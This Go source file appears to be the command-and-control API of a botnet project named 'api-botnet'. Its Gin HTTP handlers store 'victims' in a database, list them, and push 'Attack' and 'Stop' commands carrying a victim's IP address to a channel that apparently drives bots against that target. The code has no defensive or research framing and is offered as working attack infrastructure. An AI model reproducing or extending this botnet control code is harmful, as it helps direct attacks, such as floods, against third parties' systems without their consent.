package handlers

import (
	"api-botnet/cmd/globals"
	"api-botnet/database"
	"api-botnet/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func CreateVictim(c *gin.Context) {
	var victim models.Victim
	if err := c.ShouldBindJSON(&victim); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}
	if err := database.DB.Create(&victim).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create bot"})
		return
	}
	c.JSON(http.StatusCreated, victim)
}

func GetAllVictims(c *gin.Context) {
	var victims []models.Victim
	if err := database.DB.Find(&victims).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusCreated, victims)
}

func AttackVictim(c *gin.Context) {
	var victim models.Victim
	if err := c.ShouldBindJSON(&victim); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}

	globals.AttackChan <- "Attack " + victim.Ip
	c.JSON(http.StatusOK, victim.Ip)
}

func StopVictimAttack(c *gin.Context) {
	var victim models.Victim
	if err := c.ShouldBindJSON(&victim); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}
	globals.AttackChan <- "Stop " + victim.Ip
	c.JSON(http.StatusOK, "Stop Victim Attack")
}
